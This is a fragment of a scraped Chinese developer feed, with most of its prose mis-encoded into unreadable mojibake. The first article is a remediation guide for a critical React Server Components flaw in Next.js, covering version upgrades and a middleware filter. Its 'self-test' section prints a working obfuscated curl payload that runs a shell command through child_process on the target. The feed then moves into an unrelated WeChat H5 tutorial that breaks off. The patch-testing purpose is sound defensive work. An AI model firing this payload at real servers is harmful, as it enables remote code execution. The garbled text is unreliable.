                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å®˜æ–¹æ¼æ´</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2Fblog%2F2025%2F12%2F03%2Fcritical-security-vulnerability-in-react-server-components" target="_blank" title="https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components" ref="nofollow noopener noreferrer">React æœåŠ¡å™¨ç»„ä»¶ä¸­çš„å…³é”®å®‰å…¨æ¼æ´</a></p>
<h2 data-id="heading-1">è§£å†³æ–¹æ¡ˆ</h2>
<p>é€šè¿‡å‡çº§ç‰ˆæœ¬å’Œé¡¹ç›®æœ¬èº«è¿›è¡Œä¿®å¤</p>
<p><strong>æ ¹æ®å®˜æ–¹è¦æ±‚å‡çº§åº“ç‰ˆæœ¬</strong></p>
<p>ä¸‹é¢åˆ—ä¸¾nextjsçš„éƒ¨åˆ†ï¼Œæ›´å¤šå‚è€ƒ<a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2Fblog%2F2025%2F12%2F03%2Fcritical-security-vulnerability-in-react-server-components" target="_blank" title="https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components" ref="nofollow noopener noreferrer">å®˜æ–¹æ–‡æ¡£</a></p>
<pre><code class="hljs language-bash" lang="bash">npm install next@14.2.35 // <span class="hljs-keyword">for</span> 13.3.x, 13.4.x, 13.5.x, 14.x  
npm install next@15.0.7 // <span class="hljs-keyword">for</span> 15.0.x  
npm install next@15.1.11 // <span class="hljs-keyword">for</span> 15.1.x  
npm install next@15.2.8 // <span class="hljs-keyword">for</span> 15.2.x  
npm install next@15.3.8 // <span class="hljs-keyword">for</span> 15.3.x  
npm install next@15.4.10 // <span class="hljs-keyword">for</span> 15.4.x  
npm install next@15.5.9 // <span class="hljs-keyword">for</span> 15.5.x  
npm install next@16.0.10 // <span class="hljs-keyword">for</span> 16.0.x
</code></pre>
<p><strong>é¡¹ç›®æœ¬èº«è¿›è¡Œæ‹¦æˆª</strong></p>
<p>ä¿®æ”¹ nexté¡¹ç›®çš„ <code>middleware.ts</code> æ–‡ä»¶è¿›è¡Œæ‹¦æˆª</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">NextRequest</span>, <span class="hljs-title class_">NextResponse</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'next/server'</span>;

<span class="hljs-comment">// éªŒè¯ Referer æ˜¯å¦ä¸ºåˆæ³•æ¥æºï¼ˆè½»é‡çº§å®ç°ï¼Œé¿å…åˆ›å»º URL å¯¹è±¡ï¼‰</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">isValidReferer</span>(<span class="hljs-params">referer: <span class="hljs-built_in">string</span>, origin: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">boolean</span> {
  <span class="hljs-comment">// ç›´æ¥ä½¿ç”¨å­—ç¬¦ä¸²æ¯”è¾ƒï¼Œé¿å…åˆ›å»º URL å¯¹è±¡å¸¦æ¥çš„å†…å­˜å¼€é”€</span>
  <span class="hljs-keyword">return</span> referer.<span class="hljs-title function_">startsWith</span>(origin) || referer.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">`<span class="hljs-subst">${origin}</span>/`</span>);
}


<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">middleware</span>(<span class="hljs-params">request: NextRequest</span>) {
    <span class="hljs-keyword">const</span> { pathname } = request.<span class="hljs-property">nextUrl</span>;
    
    <span class="hljs-comment">// å…ˆå¿«é€Ÿè¿‡æ»¤é™æ€èµ„æºå’ŒAPIè¯·æ±‚ï¼Œé¿å…ä¸å¿…è¦çš„å®‰å…¨æ£€æŸ¥å¼€é”€</span>
    <span class="hljs-keyword">if</span> (pathname.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'/_next'</span>) || pathname.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'/favicon.ico'</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">next</span>();
    }

    <span class="hljs-comment">// å®‰å…¨æ£€æŸ¥: é˜²æ­¢ Next.js Server Actions RCE æ¼æ´</span>
    <span class="hljs-comment">// åªå¯¹å¸¦æœ‰ Next-Action å¤´çš„è¯·æ±‚è¿›è¡Œæ£€æŸ¥ï¼Œé¿å…å½±å“æ­£å¸¸é¡µé¢è¯·æ±‚æ€§èƒ½</span>
    <span class="hljs-keyword">const</span> nextActionHeader = request.<span class="hljs-property">headers</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">'Next-Action'</span>);
    <span class="hljs-keyword">if</span> (nextActionHeader) {
        <span class="hljs-keyword">const</span> contentType = request.<span class="hljs-property">headers</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">'Content-Type'</span>);

        <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦ä¸ºå¼‚å¸¸çš„ multipart/form-data è¯·æ±‚ï¼ˆä¸»è¦æ”»å‡»å‘é‡ï¼‰</span>
        <span class="hljs-keyword">if</span> (contentType?.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'multipart/form-data'</span>)) {
            <span class="hljs-keyword">const</span> referer = request.<span class="hljs-property">headers</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">'Referer'</span>);

        <span class="hljs-comment">// éªŒè¯ Referer æ¥æºï¼Œé˜²æ­¢è·¨ç«™æ”»å‡»ï¼ˆç§»é™¤æ—¥å¿—é¿å…å†…å­˜é—®é¢˜ï¼‰</span>
        <span class="hljs-keyword">if</span> (!referer || !<span class="hljs-title function_">isValidReferer</span>(referer, request.<span class="hljs-property">nextUrl</span>.<span class="hljs-property">origin</span>)) {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NextResponse</span>(<span class="hljs-string">'Forbidden'</span>, { <span class="hljs-attr">status</span>: <span class="hljs-number">403</span> });
          }
        }
    }
    
    <span class="hljs-comment">// åé¢ç»§ç»­æ‰§è¡Œä¸šåŠ¡é€»è¾‘</span>
    ...
}

</code></pre>
<h2 data-id="heading-2">è‡ªæµ‹å‘½ä»¤</h2>
<blockquote>
<p>æ³¨æ„ï¼šå°†å…¶ä¸­çš„ <code>localhost:3000</code> æ›¿æ¢ä¸ºè‡ªå·±æœ¬åœ°åœ°å€</p>
</blockquote>
<p>æ–¹æ³•ä¸€ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">curl --path-as-is -i -s -k -X $<span class="hljs-string">'POST'</span> \
    -H $<span class="hljs-string">'Host: localhost:3000'</span> -H $<span class="hljs-string">'Upgrade-Insecure-Requests: 1'</span> -H $<span class="hljs-string">'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36'</span> -H $<span class="hljs-string">'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'</span> -H $<span class="hljs-string">'Accept-Encoding: gzip, deflate'</span> -H $<span class="hljs-string">'Accept-Language: zh-TW,zh;q=0.9,en-GB;q=0.8,en-US;q=0.7,en;q=0.6'</span> -H $<span class="hljs-string">'X-Forwarded-For: 127.0.0.1'</span> -H $<span class="hljs-string">'X-Originating-Ip: 127.0.0.1'</span> -H $<span class="hljs-string">'X-Remote-Ip: 127.0.0.1'</span> -H $<span class="hljs-string">'X-Remote-Addr: 127.0.0.1'</span> -H $<span class="hljs-string">'Next-Action: x'</span> -H $<span class="hljs-string">'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFnJiYNZt'</span> -H $<span class="hljs-string">'Content-Length: 1158'</span> \
    --data-binary $<span class="hljs-string">'------WebKitFormBoundaryFnJiYNZt\x0d\x0aContent-Disposition: form-data; name=\"0\"\x0d\x0a\x0d\x0a{\x09\"a\":\"c\",\x0d\x0a  \"then\":\"$1:__proto__:then\",\x0d\x0a  \"status\":\"resolved_model\",\x0d\x0a  \"reason\":-1,\x0d\x0a  \"value\":\"{\\\"then\\\":\\\"$B\\\"}\",\x0d\x0a  \"_response\":{\x0d\x0a    \"_prefix\":\"var _0x2adb=[\'</span>\\u0063\\u0068\\u0069\\u006c\\u0064\\u005f\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\<span class="hljs-string">',\'</span>\\u006d\\u0061\\u0069\\u006e\\u004d\\u006f\\u0064\\u0075\\u006c\\u0065\<span class="hljs-string">',\'</span>\\u0074\\u006f\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\<span class="hljs-string">'];var _0x54ea=function(_0x2adb82,_0x54ea8e){_0x2adb82=_0x2adb82-0x0;var _0x1ed852=_0x2adb[_0x2adb82];return _0x1ed852;};var res=process[_0x54ea(\'</span>0x1\<span class="hljs-string">')][\'</span>require\<span class="hljs-string">'](_0x54ea(\'</span>0x0\<span class="hljs-string">'))[\'</span>execSync\<span class="hljs-string">'](\'</span><span class="hljs-built_in">id</span>\<span class="hljs-string">')[_0x54ea(\'</span>0x2\<span class="hljs-string">')]()[\'</span>trim\<span class="hljs-string">']();var _0x3236=[\'</span>assign\<span class="hljs-string">'];var _0x58c8=function(_0x3236f2,_0x58c8b7){_0x3236f2=_0x3236f2-0x0;var _0x22ddc4=_0x3236[_0x3236f2];return _0x22ddc4;};throw Object[_0x58c8(\'</span>0x0\<span class="hljs-string">')](new Error(\'</span>a\<span class="hljs-string">'),{\'</span>digest\<span class="hljs-string">':\'</span>\<span class="hljs-string">'+res});\",\x0d\x0a    \"_chunks\":\"$Q2\",\x0d\x0a    \"_formData\":{\"get\":\"$1:constructor:constructor\"}\x0d\x0a  }\x0d\x0a}\x0d\x0a\x0d\x0a------WebKitFormBoundaryFnJiYNZt\x0d\x0aContent-Disposition: form-data; name=\"1\"\x0d\x0a\x0d\x0a\"$@0\"\x0d\x0a------WebKitFormBoundaryFnJiYNZt\x0d\x0aContent-Disposition: form-data; name=\"2\"\x0d\x0a\x0d\x0a[]\x0d\x0a------WebKitFormBoundaryFnJiYNZt--'</span> \
    $<span class="hljs-string">'http://localhost:3000/'</span>
</code></pre>
<p>æ–¹æ³•äºŒï¼š</p>
<pre><code class="hljs language-bash" lang="bash">curl --path-as-is -i -s -k -X $<span class="hljs-string">'POST'</span> \
    -H $<span class="hljs-string">'Host: localhost:3000'</span> -H $<span class="hljs-string">'Upgrade-Insecure-Requests: 1'</span> -H $<span class="hljs-string">'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36'</span> -H $<span class="hljs-string">'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'</span> -H $<span class="hljs-string">'Accept-Encoding: gzip, deflate'</span> -H $<span class="hljs-string">'Accept-Language: zh-TW,zh;q=0.9,en-GB;q=0.8,en-US;q=0.7,en;q=0.6'</span> -H $<span class="hljs-string">'X-Forwarded-For: 127.0.0.1'</span> -H $<span class="hljs-string">'X-Originating-Ip: 127.0.0.1'</span> -H $<span class="hljs-string">'X-Remote-Ip: 127.0.0.1'</span> -H $<span class="hljs-string">'X-Remote-Addr: 127.0.0.1'</span> -H $<span class="hljs-string">'Connection: close'</span> -H $<span class="hljs-string">'Next-Action: x'</span> -H $<span class="hljs-string">'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryY4e746pA'</span> -H $<span class="hljs-string">'Content-Length: 118'</span> \
    --data-binary $<span class="hljs-string">'------WebKitFormBoundaryY4e746pA\x0d\x0aContent-Disposition: form-data; name=\"2\"\x0d\x0a\x0d\x0a\x0d\x0a------WebKitFormBoundaryY4e746pA--\x0d\x0a\x0d\x0a'</span> \
    $<span class="hljs-string">'http://localhost:3000/'</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¾®ä¿¡H5è®¢é˜…æ¶ˆæ¯æ¥å…¥å®æˆ˜ï¼šæ ·å¼é”™ä¹±ã€è¿”å›å€¼è§£ææŠ¥é”™ï¼Ÿé¿å‘æŒ‡å—æ¥äº†]]></title>    <link>https://juejin.cn/post/7589176150493691958</link>    <guid>https://juejin.cn/post/7589176150493691958</guid>    <pubDate>2025-12-30T02:27:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589176150493691958" data-draft-id="7589171972446994474" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¾®ä¿¡H5è®¢é˜…æ¶ˆæ¯æ¥å…¥å®æˆ˜ï¼šæ ·å¼é”™ä¹±ã€è¿”å›å€¼è§£ææŠ¥é”™ï¼Ÿé¿å‘æŒ‡å—æ¥äº†"/> <meta itemprop="keywords" content="å¾®ä¿¡,JavaScript"/> <meta itemprop="datePublished" content="2025-12-30T02:27:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å½’å…ƒç”°å±…"/> <meta itemprop="url" content="https://juejin.cn/user/4300945218869310"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¾®ä¿¡H5è®¢é˜…æ¶ˆæ¯æ¥å…¥å®æˆ˜ï¼šæ ·å¼é”™ä¹±ã€è¿”å›å€¼è§£ææŠ¥é”™ï¼Ÿé¿å‘æŒ‡å—æ¥äº†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4300945218869310/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å½’å…ƒç”°å±…
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T02:27:05.000Z" title="Tue Dec 30 2025 02:27:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ€è¿‘æ¥äº†ä¸ªéœ€æ±‚ï¼Œè¦åœ¨H5æ´»åŠ¨é¡µé‡ŒåŠ ä¸ªå¾®ä¿¡è®¢é˜…é€šçŸ¥ã€‚å¿ƒæƒ³è¿™ä¸å°±æ˜¯è°ƒä¸ªAPIçš„äº‹å—ï¼Ÿç»“æœç¿»å¼€æ–‡æ¡£ä¸€çœ‹ï¼Œå¥½å®¶ä¼™ï¼Œç½‘é¡µç«¯æ²¡æœ‰JS API ï¼Œåªèƒ½ç”¨ <code>&lt;wx-open-subscribe&gt;</code> å¼€æ”¾æ ‡ç­¾ã€‚</p>
<p>ç¡¬ç€å¤´çš®æ¥è¿›æ¥ï¼Œç»“æœå…¨æ˜¯å‘ï¼šæ ·å¼éš”ç¦»æ­»æ´»è°ƒä¸å‡†ã€remå¸ƒå±€åœ¨æ ‡ç­¾é‡Œå¤±æ•ˆã€è¿”å›å€¼å±…ç„¶æ˜¯â€œå¥—å¨ƒâ€JSON... æŠ˜è…¾äº†ä¸€ä¸‹åˆç»ˆäºæå®šï¼Œèµ¶ç´§è®°å½•ä¸€ä¸‹ï¼Œå¸Œæœ›èƒ½å¸®å¤§å®¶å°‘æ‰å‡ æ ¹å¤´å‘ã€‚</p>
<blockquote>
<p>å®˜æ–¹æ–‡æ¡£æŒ‡è·¯ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.weixin.qq.com%2Fdoc%2Fservice%2Fguide%2Fproduct%2Fsubscription_messages%2Fintro.html" target="_blank" title="https://developers.weixin.qq.com/doc/service/guide/product/subscription_messages/intro.html" ref="nofollow noopener noreferrer">å¾®ä¿¡å®˜æ–¹æ–‡æ¡£ - è®¢é˜…æ¶ˆæ¯</a></p>
</blockquote>
<hr/>
<h2 data-id="heading-0">å‘ç‚¹ä¸€ï¼šåˆ«æ‰¾APIäº†ï¼Œåªèƒ½ç”¨å¼€æ”¾æ ‡ç­¾</h2>
<p>å¾ˆå¤šåŒå­¦åšè¿‡å°ç¨‹åºï¼Œä¹ æƒ¯äº†ç”¨ <code>wx.requestSubscribeMessage</code> æ¥å£æ¥æ‹‰èµ·æˆæƒå¼¹çª—ã€‚ä½†åœ¨ <strong>H5ï¼ˆå…¬ä¼—å·ç½‘é¡µï¼‰</strong> ç¯å¢ƒä¸‹ï¼Œ<strong>å¹¶æ²¡æœ‰</strong>ç±»ä¼¼çš„ JS API å¯ç”¨ã€‚</p>
<p>ç½‘é¡µç«¯ç›®å‰<strong>åªèƒ½</strong>é€šè¿‡ <code>&lt;wx-open-subscribe&gt;</code> å¼€æ”¾æ ‡ç­¾æ¥å®ç°ã€‚</p>
<p><strong>ç‰¹åˆ«æ³¨æ„</strong>ï¼š
è¿™ä¸ªæ ‡ç­¾å†…éƒ¨çš„å†…å®¹ï¼Œ<strong>å¿…é¡»</strong>åŒ…è£¹åœ¨ <code>&lt;script type="text/wxtag-template"&gt;</code> é‡Œé¢ã€‚
å¦‚æœä½ ç›´æ¥æŠŠ <code>&lt;style&gt;</code> æˆ– <code>&lt;button&gt;</code> å†™åœ¨ <code>&lt;wx-open-subscribe&gt;</code> ä¸‹é¢ï¼Œåœ¨çœŸæœºä¸Šæ˜¯<strong>æ¸²æŸ“ä¸å‡ºæ¥</strong>çš„ï¼ˆæˆ–è€…æ ·å¼å®Œå…¨å¤±æ•ˆï¼‰ã€‚</p>
<p><strong>é”™è¯¯å†™æ³•ï¼š</strong></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">wx-open-subscribe</span> <span class="hljs-attr">...</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- âŒ é”™è¯¯ï¼šç›´æ¥å†™åœ¨æ ‡ç­¾ä¸‹ï¼ŒçœŸæœºä¸è®¤ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span>&gt;</span>è®¢é˜…<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">wx-open-subscribe</span>&gt;</span>
</code></pre>
<p><strong>æ­£ç¡®å†™æ³•ï¼š</strong></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">wx-open-subscribe</span> <span class="hljs-attr">...</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- âœ… æ­£ç¡®ï¼šå¿…é¡»åŒ…è£¹åœ¨ template è„šæœ¬ä¸­ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/wxtag-template"</span>&gt;</span><span class="xml">
        <span class="hljs-tag">&lt;<span class="hljs-name">button</span>&gt;</span>è®¢é˜…<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">wx-open-subscribe</span>&gt;</span>
</code></pre>
<p>è¿™ç©æ„æœ¬è´¨ä¸Šæ˜¯ä¸ª Web Componentï¼Œå¾®ä¿¡åœ¨é‡Œé¢æäº†ä¸ª Shadow DOMï¼ˆæ²™ç®±ç¯å¢ƒï¼‰ã€‚è¿™æ„å‘³ç€ä»€ä¹ˆï¼Ÿ</p>
<ol>
